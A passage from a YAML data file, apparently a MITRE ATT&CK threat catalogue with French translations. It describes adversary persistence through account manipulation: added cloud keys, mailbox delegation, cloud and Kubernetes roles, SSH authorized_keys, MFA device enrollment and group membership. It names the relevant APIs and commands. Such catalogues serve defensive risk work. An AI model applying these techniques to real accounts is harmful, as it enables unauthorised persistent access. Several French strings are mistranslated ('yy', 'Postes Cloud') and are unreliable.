          \ entit\xE9s de service Azure AD)\n\nDans les environnements IaaS (Infrastructure\
          \ as a Service), apr\xE8s avoir obtenu l\u2019acc\xE8s via les [comptes\
          \ cloud](https://attack.mitre.org/techniques/T1078/004), les attaquants\
          \ peuvent g\xE9n\xE9rer ou importer leurs propres cl\xE9s SSH \xE0 l\u2019\
          aide soit de l\u2019API <code>CreateKeyPair</code> ou <code>ImportKeyPair</code>\
          \ dans AWS, soit de la commande <code>gcloud compute os-login ssh-keys add</code>\
          \ dans GCP. (R\xE9f\xE9rence : GCP SSH Key Add) Cela leur permet d\u2019\
          acc\xE9der de mani\xE8re persistante aux instances au sein de l\u2019environnement\
          \ cloud sans avoir \xE0 utiliser davantage les comptes cloud compromis.\
          \ (R\xE9f\xE9rence : Expel IO Evil dans AWS) (R\xE9f\xE9rence : Expel Behind\
          \ the Scenes)\n\nLes attaquants peuvent \xE9galement utiliser l'API <code>CreateAccessKey</code>\
          \ d'AWS ou la commande <code>gcloud iam service-accounts keys create</code>\
          \ de GCP pour ajouter des cl\xE9s d'acc\xE8s \xE0 un compte. Ils peuvent\
          \ \xE9galement utiliser l\u2019API <code>CreateLoginProfile</code> d\u2019\
          AWS pour ajouter un mot de passe permettant de se connecter \xE0 la console\
          \ de gestion AWS pour le [tableau de bord des services cloud](https://attack.mitre.org/techniques/T1538).\
          \ (R\xE9f\xE9rence : Permiso Scattered Spider 2023) (R\xE9f\xE9rence : Lacework\
          \ AI Resource Hijacking 2024) Si le compte cible dispose d\u2019autorisations\
          \ diff\xE9rentes de celles du compte demandeur, l\u2019attaquant peut \xE9\
          galement \xEAtre en mesure d\u2019\xE9lever ses privil\xE8ges dans l\u2019\
          environnement (c\u2019est-\xE0-dire les [comptes cloud](https://attack.mitre.org/techniques/T1078/004)).\
          \ (R\xE9f\xE9rence : Rhino Security Labs AWS Privilege Escalation) (R\xE9\
          f\xE9rence : Sysdig ScarletEel 2.0) Par exemple, dans les environnements\
          \ Entra ID, un attaquant disposant du r\xF4le d\u2019administrateur d\u2019\
          application peut ajouter un nouvel ensemble d\u2019identifiants \xE0 l\u2019\
          entit\xE9 de service de son application. Ce faisant, l\u2019attaquant serait\
          \ en mesure d\u2019acc\xE9der aux r\xF4les et autorisations de l\u2019entit\xE9\
          \ de service, qui peuvent \xEAtre diff\xE9rents de ceux de l\u2019administrateur\
          \ d\u2019application.(R\xE9f\xE9rence : SpecterOps \u2013 \xC9l\xE9vation\
          \ de privil\xE8ges sur Azure) \n\nDans les environnements AWS, les attaquants\
          \ disposant des autorisations appropri\xE9es peuvent \xE9galement utiliser\
          \ l\u2019appel API `sts:GetFederationToken` pour cr\xE9er un ensemble temporaire\
          \ d\u2019identifiants afin de [falsifier des identifiants Web](https://attack.mitre.org/techniques/T1606)\
          \ li\xE9s aux autorisations du compte utilisateur d\u2019origine. Ces identifiants\
          \ temporaires peuvent rester valides pendant toute leur dur\xE9e de vie,\
          \ m\xEAme si les identifiants API du compte d\u2019origine sont d\xE9sactiv\xE9\
          s.\n(R\xE9f\xE9rence : Crowdstrike AWS User Federation Persistence)\n\n\
          Dans les environnements Entra ID o\xF9 la fonctionnalit\xE9 de mot de passe\
          \ d\u2019application est activ\xE9e, les attaquants peuvent \xEAtre en mesure\
          \ d\u2019ajouter un mot de passe d\u2019application \xE0 un compte utilisateur.\
          \ (R\xE9f\xE9rence : Mandiant APT42 Operations 2024) Les mots de passe d\u2019\
          application \xE9tant destin\xE9s \xE0 \xEAtre utilis\xE9s avec des appareils\
          \ h\xE9rit\xE9s qui ne prennent pas en charge l\u2019authentification multifactorielle\
          \ (MFA), l\u2019ajout d\u2019un mot de passe d\u2019application peut permettre\
          \ \xE0 un attaquant de contourner les exigences de la MFA. De plus, les\
          \ mots de passe d\u2019application peuvent rester valides m\xEAme si le\
          \ mot de passe principal de l\u2019utilisateur est r\xE9initialis\xE9. (R\xE9\
          f\xE9rence : Microsoft Entra ID App Passwords)\nhttps://attack.mitre.org/techniques/T1098/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.002
    ref_id: T1098.002
    name: Additional Email Delegate Permissions
    description: "Adversaries may grant additional permission levels to maintain persistent\
      \ access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code>\
      \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available\
      \ in on-premises Exchange and in the cloud-based service Office 365, adds permissions\
      \ to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye\
      \ APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace,\
      \ delegation can be enabled via the Google Admin console and users can delegate\
      \ accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google\
      \ Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox\
      \ folder permissions through individual folder permissions or roles. In Office\
      \ 365 environments, adversaries may assign the Default or Anonymous user permissions\
      \ or roles to the Top of Information Store (root), Inbox, or other mailbox folders.\
      \ By assigning one or both user permissions to a folder, the adversary can utilize\
      \ any other account in the tenant to maintain persistence to the target user\u2019\
      s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)\n\nThis may be\
      \ used in persistent threat incidents as well as BEC (Business Email Compromise)\
      \ incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)\
      \ to the accounts they wish to compromise. This may further enable use of additional\
      \ techniques for gaining access to systems. For example, compromised business\
      \ accounts are often used to send messages to other accounts in the network\
      \ of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)),\
      \ so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock,\
      \ D. - Defending O365 - 2019)\nhttps://attack.mitre.org/techniques/T1098/002"
    translations:
      fr:
        name: "Autorisations suppl\xE9mentaires de d\xE9l\xE9gu\xE9 par email"
        description: "Les adversaires peuvent accorder des niveaux d\u2019autorisation\
          \ suppl\xE9mentaires pour maintenir un acc\xE8s persistant \xE0 un compte\
          \ email contr\xF4l\xE9 par l\u2019adversaire. \n\nPar exemple, le cmdlet\
          \ <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
          \ disponible dans Exchange local et dans le service cloud Office 365, ajoute\
          \ des permissions \xE0 une bo\xEEte aux lettres. (Citation : Microsoft -\
          \ Ajouter la permission de la bo\xEEte aux lettres)(Citation : FireEye APT35\
          \ 2018)(Citation : Crowdstrike cach\xE9 \xE0 la vue de tous 2018) Dans Google\
          \ Workspace, la d\xE9l\xE9gation peut \xEAtre activ\xE9e via la console\
          \ d\u2019administration Google et les utilisateurs peuvent d\xE9l\xE9guer\
          \ des comptes via leurs param\xE8tres Gmail. (Citation : D\xE9l\xE9gation\
          \ Gmail)(Citation : Google s\u2019assure que vos informations sont en s\xE9\
          curit\xE9) \n\nLes adversaires peuvent \xE9galement attribuer des permissions\
          \ de dossier de bo\xEEte aux lettres via des permissions individuelles ou\
          \ des r\xF4les. Dans les environnements Office 365, les adversaires peuvent\
          \ attribuer les permissions ou r\xF4les utilisateur par d\xE9faut ou anonymes\
          \ au haut de la boutique d\u2019informations (racine), \xE0 la bo\xEEte\
          \ de r\xE9ception ou \xE0 d\u2019autres dossiers de bo\xEEte aux lettres.\
          \ En attribuant un ou les deux droits d\u2019utilisateur \xE0 un dossier,\
          \ l\u2019adversaire peut utiliser n\u2019importe quel autre compte du locataire\
          \ pour maintenir la persistance dans les dossiers de messagerie de l\u2019\
          utilisateur cible. (Citation : Mandiant Defend UNC2452 Livre blanc)\n\n\
          Cela peut \xEAtre utilis\xE9 dans les incidents de menace persistants ainsi\
          \ que dans les incidents BEC (Business Email Compromise) o\xF9 un adversaire\
          \ peut ajouter des [R\xF4les Cloud suppl\xE9mentaires](https://attack.mitre.org/techniques/T1098/003)\
          \ aux comptes qu\u2019il souhaite compromettre. Cela peut permettre l\u2019\
          utilisation de techniques suppl\xE9mentaires pour acc\xE9der aux syst\xE8\
          mes. Par exemple, les comptes professionnels compromis sont souvent utilis\xE9\
          s pour envoyer des messages \xE0 d\u2019autres comptes du r\xE9seau de l\u2019\
          entreprise cible tout en cr\xE9ant des r\xE8gles dans la bo\xEEte de r\xE9\
          ception (ex : [Spearphishing interne](https://attack.mitre.org/techniques/T1534)),\
          \ afin que les messages \xE9chappent aux m\xE9canismes de d\xE9tection du\
          \ spam/phishing. (Citation : Bienstock, D. - D\xE9fendre O365 - 2019)\n\
          https://attack.mitre.org/techniques/T1098/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.003
    ref_id: T1098.003
    name: Additional Cloud Roles
    description: "An adversary may add additional roles or permissions to an adversary-controlled\
      \ cloud account to maintain persistent access to a tenant. For example, adversaries\
      \ may update IAM policies in cloud-based environments or add a new global administrator\
      \ in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation:\
      \ Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin,\
      \ October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions,\
      \ a compromised account can gain almost unlimited access to data and settings\
      \ (including the ability to reset the passwords of other admins).(Citation:\
      \ Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account\
      \ modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or other malicious account activity. Adversaries may also modify existing\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have\
      \ compromised. This could lead to privilege escalation, particularly if the\
      \ roles added allow for lateral movement to additional accounts.\n\nFor example,\
      \ in AWS environments, an adversary with appropriate permissions may be able\
      \ to use the <code>CreatePolicyVersion</code> API to define a new version of\
      \ an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy\
      \ with additional or distinct permissions to a compromised user account.(Citation:\
      \ Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries\
      \ may add roles to adversary-controlled accounts outside the victim cloud tenant.\
      \ This allows these external accounts to perform actions inside the victim tenant\
      \ without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)\n\
      https://attack.mitre.org/techniques/T1098/003"
    translations:
      fr:
        name: "Postes Cloud suppl\xE9mentaires"
        description: "Un adversaire peut ajouter des r\xF4les ou des autorisations\
          \ suppl\xE9mentaires \xE0 un compte cloud contr\xF4l\xE9 par l\u2019adversaire\
          \ afin de maintenir un acc\xE8s persistant \xE0 un locataire. Par exemple,\
          \ les adversaires peuvent mettre \xE0 jour les politiques IAM dans des environnements\
          \ cloud ou ajouter un nouvel administrateur global dans les environnements\
          \ Office 365. (Citation : Politiques et permissions AWS IAM)(Citation :\
          \ Politiques IAM de Google Cloud)(Citation : Soutien Microsoft O365 Ajouter\
          \ un autre admin, octobre 2019)(Citation : R\xF4les d\u2019administrateur\
          \ Microsoft O365) Avec suffisamment de permissions, un compte compromis\
          \ peut obtenir un acc\xE8s quasi illimit\xE9 aux donn\xE9es et aux param\xE8\
          tres (y compris la possibilit\xE9 de r\xE9initialiser les mots de passe\
          \ d\u2019autres administrateurs). (Citation : Expulser l\u2019attaquant\
          \ AWS)\n(Citation : R\xF4les d\u2019administrateur Microsoft O365) \n\n\
          Cette modification du compte peut imm\xE9diatement suivre [Cr\xE9er un compte](https://attack.mitre.org/techniques/T1136)\
          \ ou toute autre activit\xE9 malveillante du compte. Les adversaires peuvent\
          \ \xE9galement modifier les [comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ existants qu\u2019ils ont compromis. Cela pourrait entra\xEEner une escalade\
          \ des privil\xE8ges, en particulier si les r\xF4les ajout\xE9s permettent\
          \ un transfert lat\xE9ral vers des comptes suppl\xE9mentaires.\n\nPar exemple,\
          \ dans les environnements AWS, un adversaire disposant des permissions appropri\xE9\
          es peut \xEAtre capable d\u2019utiliser l\u2019API <code>CreatePolicyVersion</code>\
          \ pour d\xE9finir une nouvelle version d\u2019une politique IAM ou l\u2019\
          API <code>AttachUserPolicy</code> pour associer une politique IAM avec des\
          \ permissions suppl\xE9mentaires ou distinctes \xE0 un compte utilisateur\
          \ compromis. (Citation : Escalade des privil\xE8ges AWS de Rhino Security\
          \ Labs)\n\nDans certains cas, les adversaires peuvent ajouter des r\xF4\
          les aux comptes contr\xF4l\xE9s par l\u2019adversaire en dehors du locataire\
          \ cloud de la victime. Cela permet \xE0 ces comptes externes d\u2019effectuer\
          \ des actions \xE0 l\u2019int\xE9rieur du locataire victime sans que l\u2019\
          adversaire ait \xE0 [Cr\xE9er un compte](https://attack.mitre.org/techniques/T1136)\
          \ ou \xE0 modifier un compte appartenant \xE0 la victime. (Citation : Invictus\
          \ IR DangerDev 2024)\nhttps://attack.mitre.org/techniques/T1098/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.004
    ref_id: T1098.004
    name: SSH Authorized Keys
    description: "Adversaries may modify the SSH <code>authorized_keys</code> file\
      \ to maintain persistence on a victim host. Linux distributions, macOS, and\
      \ ESXi hypervisors commonly use key-based authentication to secure the authentication\
      \ process of SSH sessions for remote management. The <code>authorized_keys</code>\
      \ file in SSH specifies the SSH keys that can be used for logging into the user\
      \ account for which the file is configured. This file is usually found in the\
      \ user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>\
      \ (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized\
      \ Keys) Users may edit the system\u2019s SSH config file to modify the directives\
      \ `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure\
      \ public key and RSA authentication are enabled, as well as modify the directive\
      \ `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation:\
      \ Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\
      \nAdversaries may modify SSH <code>authorized_keys</code> files directly with\
      \ scripts or shell commands to add their own adversary-supplied public keys.\
      \ In cloud environments, adversaries may be able to modify the SSH authorized_keys\
      \ file of a particular virtual machine via the command line interface or rest\
      \ API. For example, by using the Google Cloud CLI\u2019s \u201Cadd-metadata\u201D\
      \ command an adversary may add SSH keys to a user account.(Citation: Google\
      \ Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly,\
      \ in Azure, an adversary may update the authorized_keys file of a virtual machine\
      \ via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This\
      \ ensures that an adversary possessing the corresponding private key may log\
      \ in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation:\
      \ Cybereason Linux Exim Worm) It may also lead to privilege escalation where\
      \ the virtual machine or instance has distinct permissions from the requesting\
      \ user.\n\nWhere authorized_keys files are modified via cloud APIs or command\
      \ line interfaces, an adversary may achieve privilege escalation on the target\
      \ virtual machine if they add a key to a higher-privileged user. \n\nSSH keys\
      \ can also be added to accounts on network devices, such as with the `ip ssh\
      \ pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)\nhttps://attack.mitre.org/techniques/T1098/004"
    translations:
      fr:
        name: "Cl\xE9s autoris\xE9es SSH"
        description: "Les adversaires peuvent modifier le fichier <code>authorized_keys</code>\
          \ SSH pour maintenir la persistance sur un h\xF4te victime. Les distributions\
          \ Linux, macOS et les hyperviseurs ESXi utilisent couramment l\u2019authentification\
          \ bas\xE9e sur des cl\xE9s pour s\xE9curiser le processus d\u2019authentification\
          \ des sessions SSH en vue d\u2019une gestion \xE0 distance. Le <code>fichier\
          \ authorized_keys</code> dans SSH sp\xE9cifie les cl\xE9s SSH qui peuvent\
          \ \xEAtre utilis\xE9es pour se connecter au compte utilisateur pour lequel\
          \ le fichier est configur\xE9. Ce fichier se trouve g\xE9n\xE9ralement dans\
          \ le r\xE9pertoire personnel de l\u2019utilisateur sous <code>&lt;user-home&gt;/.ssh/authorized_keys</code>\
          \ (ou, sur ESXi, '/etc/ssh/keys-<username>/authorized_keys').( Citation\
          \ : cl\xE9s autoris\xE9es SSH) Les utilisateurs peuvent modifier le fichier\
          \ de configuration SSH du syst\xE8me pour modifier les directives \xAB PubkeyAuthentication\
          \ \xBB et \xAB RSAAuthentication \xBB en valeur \xAB oui \xBB afin de s\u2019\
          assurer que l\u2019authentification \xE0 cl\xE9 publique et RSA sont activ\xE9\
          es, ainsi que modifier la directive \xAB PermitRootLogin \xBB en la valeur\
          \ \xAB yy \xBB afin d\u2019activer l\u2019authentification root via SSH.\
          \ (Citation : Broadcom ESXi SSH) Le fichier de configuration SSH se trouve\
          \ g\xE9n\xE9ralement sous <code>/etc/ssh/sshd_config</code>.\n\nLes adversaires\
          \ peuvent modifier directement les fichiers <code>SSH authorized_keys</code>\
          \ \xE0 l\u2019aide de scripts ou de commandes shell pour ajouter leurs propres\
          \ cl\xE9s publiques fournies par l\u2019adversaire. Dans les environnements\
          \ cloud, les adversaires peuvent \xEAtre capables de modifier le fichier\
          \ SSH authorized_keys d\u2019une machine virtuelle particuli\xE8re via l\u2019\
          interface en ligne de commande ou l\u2019API REST. Par exemple, en utilisant\
          \ la commande \xAB add-metadata \xBB de la CLI Google Cloud, un adversaire\
          \ peut ajouter des cl\xE9s SSH \xE0 un compte utilisateur. (Citation : Google\
          \ Cloud Add Metadata)(Citation : Escalade des privil\xE8ges Google Cloud)\
          \ De m\xEAme, dans Azure, un adversaire peut mettre \xE0 jour le fichier\
          \ authorized_keys d\u2019une machine virtuelle via une requ\xEAte PATCH\
          \ vers l\u2019API. (Citation : Azure Update Virtual Machines) Cela garantit\
          \ qu\u2019un adversaire poss\xE9dant la cl\xE9 priv\xE9e correspondante\
          \ peut se connecter en tant qu\u2019utilisateur existant via SSH. (Citation\
          \ : Abus de cl\xE9 Venafi SSH)(Citation : Cybereason Linux Exim Worm) Cela\
          \ peut \xE9galement entra\xEEner une escalade de privil\xE8ges lorsque la\
          \ machine virtuelle ou l\u2019instance dispose de permissions distinctes\
          \ de la part de l\u2019utilisateur demandant.\n\nLorsque authorized_keys\
          \ fichiers sont modifi\xE9s via des API cloud ou des interfaces en ligne\
          \ de commande, un adversaire peut obtenir une escalade de privil\xE8ges\
          \ sur la machine virtuelle cible s\u2019il ajoute une cl\xE9 \xE0 un utilisateur\
          \ \xE0 plus haut privil\xE8ge. \n\nLes cl\xE9s SSH peuvent \xE9galement\
          \ \xEAtre ajout\xE9es aux comptes sur des appareils r\xE9seau, comme avec\
          \ la commande \xAB ip ssh pubkey-chain \xBB [Network Device CLI](https://attack.mitre.org/techniques/T1059/008).\
          \ (Citation : cisco_ip_ssh_pubkey_ch_cmd)\nhttps://attack.mitre.org/techniques/T1098/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.005
    ref_id: T1098.005
    name: Device Registration
    description: "Adversaries may register a device to an adversary-controlled account.\
      \ Devices may be registered in a multifactor authentication (MFA) system, which\
      \ handles authentication to the network, or in a device management system, which\
      \ handles device access and compliance.\n\nMFA systems, such as Duo or Okta,\
      \ allow users to associate devices with their accounts in order to complete\
      \ MFA requirements. An adversary that compromises a user\u2019s credentials\
      \ may enroll a new device in order to bypass initial MFA requirements and gain\
      \ persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation:\
      \ DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process\
      \ may require only a username and password to enroll the account's first device\
      \ or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft\
      \ 365 2022)\n\nSimilarly, an adversary with existing access to a network may\
      \ register a device or a virtual machine to Entra ID and/or its device management\
      \ system, Microsoft Intune, in order to access sensitive data or resources while\
      \ bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation:\
      \ AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537)(Citation:\
      \ Expel Atlas Lion 2025)\n\nDevices registered in Entra ID may be able to conduct\
      \ [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns\
      \ via intra-organizational emails, which are less likely to be treated as suspicious\
      \ by the email client.(Citation: Microsoft - Device Registration) Additionally,\
      \ an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)\
      \ on an Entra ID tenant by registering a large number of devices.(Citation:\
      \ AADInternals - BPRT)\nhttps://attack.mitre.org/techniques/T1098/005"
    translations:
      fr:
        name: Enregistrement des appareils
        description: "Les adversaires peuvent enregistrer un appareil aupr\xE8s d\u2019\
          un compte contr\xF4l\xE9 par l\u2019adversaire. Les appareils peuvent \xEA\
          tre enregistr\xE9s dans un syst\xE8me d\u2019authentification multifacteur\
          \ (MFA), qui g\xE8re l\u2019authentification du r\xE9seau, ou dans un syst\xE8\
          me de gestion d\u2019appareil, qui g\xE8re l\u2019acc\xE8s et la conformit\xE9\
          \ aux appareils.\n\nLes syst\xE8mes MFA, tels que Duo ou Okta, permettent\
          \ aux utilisateurs d\u2019associer des appareils \xE0 leur compte afin de\
          \ remplir les exigences MFA. Un adversaire qui compromet les identifiants\
          \ d\u2019un utilisateur peut inscrire un nouvel appareil afin de contourner\
          \ les exigences initiales de MFA et d\u2019obtenir un acc\xE8s persistant\
          \ \xE0 un r\xE9seau. (Citation : CISA MFA PrintNightmare)(Citation : DarkReading\
          \ FireEye SolarWinds) Dans certains cas, le processus d\u2019auto-inscription\
          \ MFA peut n\xE9cessiter seulement un nom d\u2019utilisateur et un mot de\
          \ passe pour inscrire le premier appareil du compte ou pour enregistrer\
          \ un appareil sur un compte inactif. (Citation : Mandiant APT29 Microsoft\
          \ 365 2022)\n\nDe m\xEAme, un adversaire ayant d\xE9j\xE0 acc\xE8s \xE0\
          \ un r\xE9seau peut enregistrer un appareil ou une machine virtuelle sur\
          \ Entra ID et/ou son syst\xE8me de gestion d\u2019appareil, Microsoft Intune,\
          \ afin d\u2019acc\xE9der \xE0 des donn\xE9es ou ressources sensibles tout\
          \ en contournant les politiques d\u2019acc\xE8s conditionnels. (Citation\
          \ : AADInternals - Enregistrement des appareils)(Citation : AADInternals\
          \ - Contournement d\u2019acc\xE8s conditionnel)(Citation : Microsoft DEV-0537)(Citation\
          \ : Expel Atlas Lion 2025)\n\nLes appareils enregistr\xE9s dans l\u2019\
          identifiant Entra peuvent \xEAtre capables de mener des campagnes [Spearphishing\
          \ interne](https://attack.mitre.org/techniques/T1534) via des e-mails intra-organisationnels,\
          \ qui sont moins susceptibles d\u2019\xEAtre consid\xE9r\xE9es comme suspectes\
          \ par le client de messagerie. (Citation : Microsoft - Enregistrement des\
          \ appareils) De plus, un adversaire peut effectuer un [Service Exhaustion\
          \ Flood](https://attack.mitre.org/techniques/T1499/002) sur un locataire\
          \ Entra ID en enregistrant un grand nombre d\u2019appareils. (Citation :\
          \ AADInternals - BPRT)\nhttps://attack.mitre.org/techniques/T1098/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.006
    ref_id: T1098.006
    name: Additional Container Cluster Roles
    description: "An adversary may add additional roles or permissions to an adversary-controlled\
      \ user or service account to maintain persistent access to a container orchestration\
      \ system. For example, an adversary with sufficient permissions may create a\
      \ RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes\
      \ account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023)\
      \ Where attribute-based access control (ABAC) is in use, an adversary with sufficient\
      \ permissions may modify a Kubernetes ABAC policy to give the target account\
      \ additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification\
      \ may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or other malicious account activity. Adversaries may also modify existing\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have\
      \ compromised.  \n\nNote that where container orchestration systems are deployed\
      \ in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes\
      \ Service, and Azure Kubernetes Service, cloud-based  role-based access control\
      \ (RBAC) assignments or ABAC policies can often be used in place of or in addition\
      \ to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation:\
      \ AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes\
      \ Service Service Accounts) In these cases, this technique may be used in conjunction\
      \ with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).\n\
      https://attack.mitre.org/techniques/T1098/006"
    translations:
      fr:
        name: "R\xF4les suppl\xE9mentaires dans les clusters de conteneurs"
        description: "Un adversaire peut ajouter des r\xF4les ou des permissions suppl\xE9\
          mentaires \xE0 un compte utilisateur ou service contr\xF4l\xE9 par l\u2019\
          adversaire afin de maintenir un acc\xE8s persistant \xE0 un syst\xE8me d\u2019\
          orchestration de conteneurs. Par exemple, un adversaire disposant de permissions\
          \ suffisantes peut cr\xE9er un RoleBinding ou un ClusterRoleBinding pour\
          \ lier un Role ou un ClusterRole \xE0 un compte Kubernetes. (Citation :\
          \ Kubernetes RBAC)(Citation : Aquasec Kubernetes Attack 2023) Lorsque le\
          \ contr\xF4le d\u2019acc\xE8s bas\xE9 sur les attributs (ABAC) est utilis\xE9\
          , un adversaire disposant de permissions suffisantes peut modifier une politique\
          \ ABAC Kubernetes pour accorder au compte cible des permissions suppl\xE9\
          mentaires. (Citation : Kuberentes ABAC)\n \nCette modification du compte\
          \ peut imm\xE9diatement suivre [Cr\xE9er un compte](https://attack.mitre.org/techniques/T1136)\
          \ ou toute autre activit\xE9 malveillante du compte. Les adversaires peuvent\
          \ \xE9galement modifier les [comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ existants qu\u2019ils ont compromis.  \n\nNotez que lorsque les syst\xE8\
          mes d\u2019orchestration de conteneurs sont d\xE9ploy\xE9s dans des environnements\
          \ cloud, comme avec Google Kubernetes Engine, Amazon Elastic Kubernetes\
          \ Service et Azure Kubernetes Service, les affectations de contr\xF4le d\u2019\
          acc\xE8s bas\xE9 sur les r\xF4les (RBAC) ou les politiques ABAC bas\xE9\
          es sur le cloud peuvent souvent \xEAtre utilis\xE9es \xE0 la place ou en\
          \ compl\xE9ment des attributions locales de permissions. (Citation : Google\
          \ Cloud Kubernetes IAM)(Citation : AWS EKS IAM R\xF4les pour les comptes\
          \ de service)(Citation : Microsoft Azure Kubernetes Service Service Accounts)\
          \ Dans ces cas, cette technique peut \xEAtre utilis\xE9e en conjonction\
          \ avec [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).\n\
          https://attack.mitre.org/techniques/T1098/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.007
    ref_id: T1098.007
    name: Additional Local or Domain Groups
    description: "An adversary may add additional local or domain groups to an adversary-controlled\
      \ account to maintain persistent access to a system or domain.\n\nOn Windows,\
      \ accounts may use the `net localgroup` and `net group` commands to add existing\
      \ users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation:\
      \ Microsoft Net Group) On Linux, adversaries may use the `usermod` command for\
      \ the same purpose.(Citation: Linux Usermod)\n\nFor example, accounts may be\
      \ added to the local administrators group on Windows devices to maintain elevated\
      \ privileges. They may also be added to the Remote Desktop Users group, which\
      \ allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
      \ to log into the endpoints in the future.(Citation: Microsoft RDP Logons) Adversaries\
      \ may also add accounts to VPN user groups to gain future persistence on the\
      \ network.(Citation: Cyber Security News) On Linux, accounts may be added to\
      \ the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003)\
      \ for elevated privileges. \n\nIn Windows environments, machine accounts may\
      \ also be added to domain groups. This allows the local SYSTEM account to gain\
      \ privileges on the domain.(Citation: RootDSE AD Detection 2022)\nhttps://attack.mitre.org/techniques/T1098/007"
    translations:
      fr:
        name: "Groupes locaux ou de domaine suppl\xE9mentaires"
        description: "Un adversaire peut ajouter des groupes locaux ou de domaines\
          \ suppl\xE9mentaires \xE0 un compte contr\xF4l\xE9 par l\u2019adversaire\
          \ afin de maintenir un acc\xE8s persistant \xE0 un syst\xE8me ou domaine.\n\
          \nSous Windows, les comptes peuvent utiliser les commandes \xAB net localgroup\
          \ \xBB et \xAB net group \xBB pour ajouter des utilisateurs existants aux\
          \ groupes locaux et de domaines. (Citation : Microsoft Net Localgroup)(Citation\
          \ : Microsoft Net Group) Sur Linux, les adversaires peuvent utiliser la\
          \ commande \xAB usermod \xBB pour le m\xEAme usage. (Citation : Usermod\
          \ Linux)\n\nPar exemple, des comptes peuvent \xEAtre ajout\xE9s au groupe\
          \ des administrateurs locaux sur les appareils Windows pour maintenir des\
          \ privil\xE8ges \xE9lev\xE9s. Ils peuvent \xE9galement \xEAtre ajout\xE9\
          s au groupe Utilisateurs de bureau distant, ce qui leur permet d\u2019utiliser\
          \ [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
          \ pour se connecter aux points de terminaison \xE0 l\u2019avenir. (Citation\
          \ : Connexions Microsoft RDP) Les adversaires peuvent \xE9galement ajouter\
          \ des comptes \xE0 des groupes d\u2019utilisateurs VPN pour obtenir une\
          \ persistance future sur le r\xE9seau. (Citation : Cyber Security News)\
          \ Sous Linux, des comptes peuvent \xEAtre ajout\xE9s au groupe sudoers,\
          \ leur permettant d\u2019exploiter de mani\xE8re persistante [Sudo et Sudo\
          \ Caching](https://attack.mitre.org/techniques/T1548/003) pour obtenir des\
          \ privil\xE8ges \xE9lev\xE9s. \n\nDans les environnements Windows, les comptes\
          \ machines peuvent \xE9galement \xEAtre ajout\xE9s \xE0 des groupes de domaines.\
          \ Cela permet au compte SYSTEM local d\u2019obtenir des privil\xE8ges sur\
          \ le domaine. (Citation : D\xE9tection AD RootDSE 2022)\nhttps://attack.mitre.org/techniques/T1098/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102
    ref_id: T1102
    name: Web Service
    description: 'Adversaries may use an existing, legitimate external Web service
      as a means for relaying data to/from a compromised system. Popular websites,
      cloud services, and social media acting as a mechanism for C2 may give a significant
